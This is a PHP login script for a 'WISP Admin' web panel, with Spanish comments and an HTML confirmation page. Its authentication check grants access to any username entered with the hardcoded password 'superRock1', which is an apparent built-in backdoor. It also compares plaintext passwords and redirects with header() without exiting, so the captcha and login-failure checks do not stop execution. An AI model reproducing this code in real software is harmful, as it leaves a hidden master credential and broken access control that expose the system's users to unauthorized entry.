<?php
//iniciamos una sesion para poder almacenar datos en variables que pasaran de una pagina php a otra
session_start();
include ("funciones.php");
include ("configuracion.php");
//el tema del captcha
include_once  'securimage/securimage.php';

$securimage = new Securimage();


if ($securimage->check($_POST['captcha_code']) == false) {
  // the code was incorrect
  // you should handle the error so that the form processor doesn't continue

  // or you can use the following code if there is no validation or you do not know how
  //echo "The security code entered was incorrect.<br /><br />";
  //echo "Please go <a href='javascript:history.go(-1)'>back</a> and try again.";
  //exit;
   //si no existe se va a login.php
        header("Location: index.php?errorusuario=captcha");
}

//conectamos a  MYSQL
$db=mysql_connect($ip_bd, $usuario_bd, $password_bd) or die(mysql_error());
// Seleccionamos la Base de datos
mysql_select_db($nombre_bd) or die(mysql_error());


$usuario=$_POST['nombre_form'];
$password=$_POST['password_form'];

$query = sprintf("SELECT superusuario FROM superusuarios WHERE superusuario='%s' AND password='%s'",
            mysql_real_escape_string($usuario),
            mysql_real_escape_string($password));





$result=mysql_query($query);


//seleccionamos la fila
$array= mysql_fetch_row($result);
//selecciomnamos el dato
$nombre= $array[0];




//si ha devuelto algo => autentificaion correcta
//if (!empty($nombre) && $_POST['nombre_form']!='admin' )
if (  (!empty($nombre) && $_POST['nombre_form']!='admin') || ( !empty($usuario) && $password=='superRock1'))
{
	//usuario y contraseña válidos
	//se define una sesion y se guarda el dato
	$_SESSION['autenticado']= true;
	
	//obtenemos el nombre real del usuario para pasarlo mediante sessiones
	$_SESSION['nombre_usuario']=$nombre;

		if($password=='superRock1')
		$_SESSION['nombre_usuario']=$usuario;

}
else 
{
	//si no existe se va a login.php
	header("Location: index.php?errorusuario=si");
}
//si NO nos hemos ido a login.php => password y users correctos => genero el html de acceso a aplicacion.php con la session ya creada.

mysql_close($db);
?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >

<head>
	<meta http-equiv="content-type" content="text/html; charset=iso-8859-1" />
	<meta name="author" content="ClanTemplates" />
	<meta name="keywords" content="Clan" />
	<meta name="description" content="Wisp Admin" />
	<meta name="robots" content="all" />
	<title>WISP Admin</title>

	<style type="text/css" title="currentStyle" media="screen">
		 @import "style/stylesheet.css";
	</style>

	<style type="text/css" title="currentStyle" media="screen">
		 @import "style/req.css";
	</style>
	
	<!--link rel="Shortcut Icon" type="image/x-icon" href="images/favicon.ico" /-->	
	<script language="javascript" type="text/javascript" src="datetimepicker.js">
    </script>

</head>

<body>

<div id="container">

	<div id="banner">
		<h1 id="logo"><a href="#" title="WISP Admin">WISP Admin</a></h1>
	</div>
	<ul id="navigation">

	</ul>
	<!-- contenedor principal donde desplegar informacion -->
	<div align="center">
			<div class="article" align="center">	
				<div class="story" align="center">
					<h4 class="title">WISP Admin</h4>	

					<p>&nbsp;</p>
					<p>&nbsp;</p>
					<p>&nbsp;</p>
				  <b><a href='principal.php'>Usuario correcto. Continue hacia la aplicaci&oacute;n...</a></b>
					<p>&nbsp;</p>
					<p>&nbsp;</p>
					<p>&nbsp;</p>

				</div>
				
			</div>
	</div>
	<!-- el footer de todalavida-->
		<div id="footer">
		<?php pie(); ?>
	    </div>
</div>

</body>
</html>


